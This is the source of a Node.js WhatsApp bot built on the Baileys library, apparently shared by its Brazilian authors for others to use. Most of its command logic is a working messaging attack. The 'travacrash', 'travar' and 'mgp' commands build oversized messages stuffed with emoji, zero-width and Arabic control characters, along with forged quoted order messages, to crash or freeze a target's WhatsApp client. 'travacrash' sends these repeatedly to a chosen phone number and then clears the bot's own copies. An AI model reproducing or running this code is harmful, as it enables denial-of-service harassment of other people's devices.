 ///_Este bot foi criado pelo Rony e o zalts caso vá usar
///_Não retire os créditos do canal 
/*
                🌐 Canais 🌐

Rony: https://youtube.com/@Spectrum_bots
Zalts: https://youtube.com/@zalts

                ⚙️ REST API ⚙️
                
             https://silverstars.shop/
*/

const { 
default: makeWASocket, downloadContentFromMessage,  emitGroupParticipantsUpdate,  emitGroupUpdate,  makeInMemoryStore,  prepareWAMessageMedia, MediaType,  WAMessageStatus, AuthenticationState, GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions,  useMultiFileAuthState, BufferJSON,  WAMessageProto,  MessageOptions,	 WAFlag,  WANode,	 WAMetric,	 ChatModification,  MessageTypeProto,  WALocationMessage, ReconnectMode,  WAContextInfo,  proto,	 WAGroupMetadata,  ProxyAgent,	 waChatKey,  MimetypeMap,  MediaPathMap,  WAContactMessage,  WAContactsArrayMessage,  WAGroupInviteMessage,  WATextMessage,  WAMessageContent,  WAMessage,  BaileysError,  WA_MESSAGE_STATUS_TYPE,  MediaConnInfo,   generateWAMessageContent, URL_REGEX,  Contact, WAUrlInfo,  WA_DEFAULT_EPHEMERAL,  WAMediaUpload,  mentionedJid,  processTime,	 Browser,  MessageType,  Presence,  WA_MESSAGE_STUB_TYPES,  Mimetype,  relayWAMessage,	 Browsers,  GroupSettingChange,  delay,  DisconnectReason,  WASocket,  getStream,  WAProto,  isBaileys,  AnyMessageContent,  generateWAMessageFromContent, fetchLatestBaileysVersion,  processMessage,  processingMutex
} = require('@adiwajshing/baileys');
let pino = require('pino')
const fs = require('fs')
const axios = require('axios');

const { buttonkal } = require('./lib/buttonkal')

 const { travavideo } = require('./lib/travavideo')

async function ligarbot() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'debug', stream: 'store' }) })

const { state, saveCreds } = await useMultiFileAuthState('./sessao')
const { version, isLatest } = await fetchLatestBaileysVersion()

const iza = makeWASocket({
version,  
logger: pino({ level: 'silent'}),
printQRInTerminal: true,
qrTimeout: 180000,
browser: ['Rony_Bot', 'Chrome', '1.0.0'],
auth: state
})
store.bind(iza.ev)


iza.ev.on('chats.set', () => {
console.log('setando conversas...')
})


iza.ev.on('contacts.set', () => {
console.log('setando contatos...')
})

iza.ev.on('creds.update', saveCreds)

iza.ev.on('messages.upsert', async ({ messages }) => {
try {
const info = messages[0]
if (!info.message) return 

const key = {
    remoteJid: info.key.remoteJid,
    id: info.key.id, 
    participant: info.key.participant 
}
await iza.readMessages([key])
if (info.key && info.key.remoteJid == 'status@broadcast') return
const altpdf = Object.keys(info.message)
const type = altpdf[0] == 'senderKeyDistributionMessage' ? altpdf[1] == 'messageContextInfo' ? altpdf[2] : altpdf[1] : altpdf[0]

const from = info.key.remoteJid

var body = (type === 'conversation') ?
info.message.conversation : (type == 'imageMessage') ?
info.message.imageMessage.caption : (type == 'videoMessage') ?
info.message.videoMessage.caption : (type == 'extendedTextMessage') ?
info.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ?
info.message.buttonsResponseMessage.selectedButtonId : (info.message.listResponseMessage && info.message.listResponseMessage.singleSelectReply.selectedRowId.startsWith(prefix) && info.message.listResponseMessage.singleSelectReply.selectedRowId) ? info.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ?
info.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (info.message.buttonsResponseMessage?.selectedButtonId || info.message.listResponseMessage?.singleSelectReply.selectedRowId || info.text) : ''

const args = body.trim().split(/ +/).slice(1)

const text = q = args.join(" ")

prefix = '!'
const isCmd = body.startsWith(prefix)
const comando = isCmd ? body.slice(1).trim().split(/ +/).shift().toLocaleLowerCase() : null


var texto_exato = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''

const texto = texto_exato.slice(0).trim().split(/ +/).shift().toLowerCase()

async function escrever (texto) {
await iza.sendPresenceUpdate('composing', from) 
await esperar(1000)   
iza.sendMessage(from, { text: texto }, {quoted: info})
}

const enviar = (texto) => {
iza.sendMessage(from, { text: texto }, {quoted: info})
}

const esperar = async (tempo) => {
    return new Promise(funcao => setTimeout(funcao, tempo));
}

switch(comando) {
case 'mgp':
let audcrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666 , status: 200, jpegThumbnail: null, surface: 200, message: `${buttonkal}\n${travavideo}`, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
await iza.sendMessage(from, {text: '</• 𝓡𝓸𝓰𝓮𝓻́𝓲𝓸 - ℛ𝑜𝑜𝒽 •/> *DOMINA!*'}, { quoted: audcrash})
iza.chatModify({ clear: { messages: [{ id: key.id, fromMe: true, timestamp: messageTimestamp.low }] } }, key.remoteJid, [])
break

case 'travacrash':
try {
if(q && args[0] === "-fake") {
teks = ""
for (var i = 0; i < 10; i++) {
teks += "💤"
}
tekks = ""
for (var i = 0; i < 100; i++) {
tekks += "؅؀؁؂؃؄"
}
tekkss = ""
for (var i = 0; i < 800; i++) {
tekkss += "‍"
}
let buttons = [
{buttonId: `ꪶ͢͜😈ℛ𝑜𝑜𝒽 𝐃𝚯𝐌𝐈𝐍𝜟😈ꫂ`, buttonText: {displayText: teks}, type: 1},
{buttonId: `ꪶ͢͜💦ℛ𝑜𝑜𝒽 𝐃𝚯𝐌𝐈𝐍𝜟💦ꫂ`, buttonText: {displayText: teks}, type: 1},
{buttonId: `ꪶ͢͜🌈ℛ𝑜𝑜𝒽 𝐃𝚯𝐌𝐈𝐍𝜟🌈ꫂ`, buttonText: {displayText: teks}, type: 1}
]
fuck = {
text: `ꪶ͢͜ℛ𝑜𝑜𝒽 𝐃𝚯𝐌𝐈𝐍𝜟𝐍𝐃𝚯 𝐖𝜮𝐁ꫂ ${tekkss}${tekks}`,
buttons: buttons,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "120363022697760691@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: teks, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
let abc = await iza.sendMessage(from, fuck, {quoted: selocrash})
await iza.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
return
}
try {
vacilao = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participant
} catch {
if(q.includes("/")) {
vacilao = q.split("/")[0] || ""
} else {
vacilao = `${args.join(" ").replace(/\D/g,'')}`
}
}
try {
envi = q.split("/")[1].replace(/\D/g,'') || 1
} catch {
envi = 1
}
let id = `${vacilao.replace(/\D/g,'')}`
if(!id) return enviar(`Cade o número?`)
let [result] = await iza.onWhatsApp(id)
if(!result) return enviar(`Numero inexistente!`)
teks = ""
for (var i = 0; i < 60000; i++) {
teks += "💤"
}
let buttons = [
{buttonId: `ꪶ͢͜😈ℛ𝑜𝑜𝒽 𝐃𝚯𝐌𝐈𝐍𝜟😈ꫂ`, buttonText: {displayText: teks}, type: 1},
{buttonId: `ꪶ͢͜💦ℛ𝑜𝑜𝒽 𝐃𝚯𝐌𝐈𝐍𝜟💦ꫂ`, buttonText: {displayText: teks}, type: 1},
{buttonId: `ꪶ͢͜🌈ℛ𝑜𝑜𝒽 𝐃𝚯𝐌𝐈𝐍𝜟🌈ꫂ`, buttonText: {displayText: teks}, type: 1}
]
fuck = {
text: `ꪶ͢͜ℛ𝑜𝑜𝒽 𝐃𝚯𝐌𝐈𝐍𝜟𝐍𝐃𝚯 𝐖𝜮𝐁ꫂ`,
buttons: buttons,
footer: "e outros 101631 caracteres",
contextInfo: {
"forwardingScore": 999,
"isForwarded": true}}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -666, status: 200, jpegThumbnail: null, surface: 200, message: teks, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
for (var i = 0; i < Number(envi); i++) {
let abc = await iza.sendMessage(result.jid, fuck, {quoted: selocrash})
await iza.chatModify({ clear: { messages: [{ id: abc.key.id, fromMe: true, timestamp: abc.messageTimestamp.low }] } }, abc.key.remoteJid, [])
await esperar(500)
}
iza.sendMessage(from, {text: `Enviei ${envi} travas para @${result.jid.split("@")[0]}`, mentions: [result.jid]})
} catch (err) {
console.log(err)
enviar("Hmm deu algum erro!!")
}
break
case 'travar':
let user = `${q}@s.whatsapp.net`
for (var i = 0; i < 80; i++) {
teks = "؅؀؁؂؃؄"
}
tekks = ""
for (var i = 0; i < 6000; i++) {
tekks += "💤"
}
tekkss = ""
for (var i = 0; i < 6000; i++) {
tekkss = "‍"
}
let selocrash = { key: { fromMe: false, "participant": "0@s.whatsapp.net", "remoteJid": "0@g.us"}, "message": { orderMessage: { itemCount: -999, status: 200, jpegThumbnail: null, surface: 200, message: teks, orderTitle: '❔🤣', sellerJid: '0@s.whatsapp.net' } }, contextInfo: { "forwardingScore": 999, "isForwarded": true }, sendEphemeral: true }
await iza.sendMessage(user, {text: `ꪶ͢͜ℛ𝑜𝑜𝒽 𝐃𝚯𝐌𝐈𝐍𝜟𝐍𝐃𝚯 𝐖𝜮𝐁ꫂ\n ${tekkss}\n${tekks}\n${teks}\n${buttonkal}`}, {quoted: selocrash})

break
case 'escreva':
escrever(`oooi`)
break
case 'responda':
enviar(`oooi`)
break
case 'ba':
sections = [
    {
	title: "Section 1",
	rows: [
	    {title: "Option 1", rowId: "option1"},
	    {title: "Option 2", rowId: "option2", description: "This is a description"}
	]
    },
   {
	title: "Section 2",
	rows: [
	    {title: "Option 3", rowId: "option3"},
	    {title: "Option 4", rowId: "option4", description: "This is a description V2"}
	]
    },
]

listMessage = {
  text: "This is a list",
  footer: "nice footer, link: https://google.com",
  title: "Amazing boldfaced list title",
  buttonText: "Required, text on the button to view the list",
  sections
}

iza.sendMessage(from, listMessage)
break
}





} catch (erro) {
console.log(erro)
}})




iza.ev.on('connection.update', (update) => {
const { connection, lastDisconnect } = update
if(lastDisconnect === undefined) {

}

if(connection === 'close') {
var shouldReconnect = (lastDisconnect.error.Boom)?.output?.statusCode !== DisconnectReason.loggedOut  
ligarbot()
}
if(update.isNewLogin) {
console.log(`conectado com sucesso`)
}})}
ligarbot()


fs.watchFile('./index.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log('A index foi editada, irei reiniciar...');
process.exit()
}
})